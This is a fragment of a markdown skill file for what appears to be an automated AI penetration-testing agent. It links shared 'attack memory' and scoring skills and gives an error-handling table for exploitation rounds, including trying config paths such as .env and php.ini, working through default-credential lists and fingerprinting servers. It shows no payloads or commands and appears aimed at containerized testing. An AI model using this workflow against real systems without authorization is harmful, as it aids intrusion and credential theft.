> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Configuration file not accessible or permission denied | Try alternative config paths (`.env`, `php.ini`, `httpd.conf`); if all fail → record `"status": "config_inaccessible"` |
| Default credentials list exhausted without success | Record `"status": "defaults_patched"`, set `final_verdict: "not_vulnerable"` |
| Server version/header information suppressed | Use behavioral fingerprinting as fallback; note reduced confidence in scoring |
